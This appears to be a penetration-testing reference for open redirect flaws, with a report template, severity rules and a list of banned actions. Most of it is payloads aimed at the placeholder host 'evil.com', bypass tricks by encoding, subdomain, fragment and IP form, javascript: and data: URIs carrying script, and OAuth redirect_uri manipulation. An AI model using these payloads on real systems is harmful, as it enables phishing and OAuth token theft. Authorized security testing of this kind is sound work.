# Open Redirect Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify open redirect vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual phishing attacks are prohibited
> - Open redirect payloads are for understanding attack surface only, **no phishing pages created**
> - Validation proves vulnerability existence (URL parameter controllable), **no actual redirection executed for harm**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Test URL parameters, redirect endpoints, and OAuth/login callbacks**

---

## Validation Objectives (Within Security Boundary)

Open redirect vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| URL Parameter Redirect | ✓ Test if URL parameter accepted | - | Redirect to phishing page |
| Path-based Redirect | ✓ Test /redirect?url= patterns | - | Create malicious redirect chain |
| OAuth Redirect URI | ✓ Test redirect_uri validation | - | Steal OAuth tokens |
| Login Redirect | ✓ Test post-login redirect | - | Redirect to credential harvesting |
| Header-based Redirect | ✓ Test CRLF in headers | - | Header injection attack |

**Safe Validation Method**: Test redirect to harmless external URL (your own domain or Collaborator), do not redirect to phishing or malicious sites.

---

## Common Open Redirect Patterns

### URL Parameter Redirect

```bash
# Basic parameter testing
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
?target=https://evil.com
?rurl=https://evil.com
?dest=https://evil.com
?destination=https://evil.com
?redir=https://evil.com
?redirect_uri=https://evil.com
?redirect_url=https://evil.com
?urlredirect=https://evil.com
?return=https://evil.com
?returnUrl=https://evil.com
?go=https://evil.com
?goto=https://evil.com
?link=https://evil.com
?location=https://evil.com
?forward=https://evil.com
?continue=https://evil.com
?callback=https://evil.com
?jump=https://evil.com
?url=http://YOUR_COLLABORATOR/open-redirect-test
```

### Path-based Redirect

```bash
# Path parameter redirect
/redirect?url=https://evil.com
/go?url=https://evil.com
/out?url=https://evil.com
/login?redirect=https://evil.com
/logout?redirect=https://evil.com
/api/redirect?url=https://evil.com
```

---

## Bypass Techniques

### Protocol Bypass

```bash
# Missing protocol - browser may add https://
?url=evil.com
?url=//evil.com
?url=\\/evil.com
?url=\\\\evil.com
```

### Subdomain Trick

```bash
# Trusted domain as subdomain
?url=https://trusted.com.evil.com
?url=https://eviltrusted.com
?url=https://trusted.com@evil.com
```

### URL Encoding Bypass

```bash
?url=https%3A%2F%2Fevil.com
?url=https://%2F%2Fevil.com
?url=%2F%2Fevil.com
?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Parameter Pollution

```bash
?url=https://trusted.com?url=https://evil.com
?url=https://evil.com&url=https://trusted.com
```

### Fragment Bypass

```bash
?url=https://trusted.com#@evil.com/
?url=https://trusted.com%23.evil.com/
?url=https://trusted.com#evil.com/path
```

### Regex Bypass

```bash
# If validation requires trusted.com prefix
?url=https://trusted.com.evil.com
?url=https://trusted.com%00.evil.com
?url=https://trusted.com%0d.evil.com
?url=https://trusted.com%0a.evil.com
```

### IPv4/IPv6 Bypass

```bash
?url=http://127.0.0.1
?url=http://2130706433  # Decimal IP
?url=http://0x7f000001  # Hex IP
?url=http://[::ffff:127.0.0.1]
```

### Data URI Bypass

```bash
?url=data:text/html,<script>alert(1)</script>
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## OAuth/OpenID Redirect

### OAuth redirect_uri Testing

```bash
# OAuth redirect_uri manipulation
/oauth/authorize?redirect_uri=https://evil.com
/oauth/callback?redirect_uri=https://evil.com
/auth?redirect_uri=https://evil.com

# Bypass patterns
?redirect_uri=https://trusted.com.evil.com
?redirect_uri=https://trusted.com%00@evil.com
?redirect_uri=https://trusted.com/@evil.com
?redirect_uri=https://evil.com#trusted.com
?redirect_uri=https://trusted.com/callback?url=https://evil.com
```

**Note**: OAuth redirect_uri vulnerabilities can lead to token theft - test with Collaborator only.

---

## Login/Logout Redirect

```bash
# Post-login redirect
/login?redirect=https://evil.com
/login?next=https://evil.com
/login?return=https://evil.com
/auth/login?goto=https://evil.com

# Post-logout redirect
/logout?redirect=https://evil.com
/signout?url=https://evil.com
```

---

## JavaScript-based Redirect

```javascript
// Check for JavaScript redirect patterns
window.location = param;
location.href = param;
location.replace(param);
document.location = param;

// Test payload
?url=javascript:alert(1)
?url=javascript:window.location='https://evil.com'
?url=javascript:document.location='https://evil.com'
```

---

## Analysis Process

1. Identify URL/redirect parameters from fingerprint and discovery phase
2. Test with harmless external URL (Collaborator or controlled domain)
3. Observe if browser actually redirects to external URL
4. If blocked, apply bypass techniques (encoding, subdomain, fragment)
5. Test OAuth/callback endpoints separately
6. **Stop validation**, confirm redirect capability exists
7. Do not redirect to actual phishing or malicious sites

---

## Output

```markdown
## Vulnerability: Open Redirect

### Location
{URL} - {parameter name}

### Redirect Type
{Parameter-based / Path-based / OAuth / Login}

### Proof Payload
?url=https://YOUR_COLLABORATOR/open-redirect-test

### Validation Result
- Redirect accepted: ✓ Yes
- Redirect executed: ✓ Browser redirected to external URL
- Bypass required: {none / encoding / subdomain trick}

### Risk Level
{see severity rules}

### Severity Classification

Open redirect harm depends on **what chain it is part of**. Plain open redirect (jumping to external URL) has limited practical harm — phishing value is low and depends on social engineering. Only when it is part of OAuth/SSO callback dependency can it steal tokens, reaching medium/high severity.

| Actual case | Severity | Note |
|---------|------|------|
| Open redirect exists in OAuth/SSO redirect_uri chain, can intercept code/token | **Medium-High** | Combined with OAuth flaw can steal token (see oauth.md)|
| Open redirect can bypass URL whitelist (e.g. SSRF/SSO callback validation)| Medium | Stepping stone for other vulnerabilities |
| Plain open redirect, no sensitive chain dependency | **Low** | Phishing value only, depends on social engineering, limited practical harm |
| Redirect requires user interaction and weak target controllability | Low | Harsh exploitation conditions |

**Key judgment**: Reporting Medium or above must confirm the redirect point is in a sensitive chain (OAuth callback/whitelist bypass/sensitive redirect). Plain redirect records Low — this reflects the reality that most open redirects are low severity in practice.

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Phishing redirect | Do not redirect to credential harvesting pages |
| ❌ Token theft | Do not use OAuth redirect to capture real tokens |
| ❌ Malware distribution | Do not redirect to malicious downloads |
| ❌ Brand impersonation | Do not create pages mimicking trusted sites |
| ❌ Social engineering | Do not combine with phishing campaigns |

---

## Impact Scenarios (For Risk Explanation Only)

Open redirect can be used for:
- Phishing attacks (trusted domain redirects to evil.com)
- OAuth token theft (redirect_uri bypass captures tokens)
- Bypass same-origin policy (in some browser contexts)
- Redirect chains (multiple hops to evade filters)

These are **risk explanations**, not actions to execute.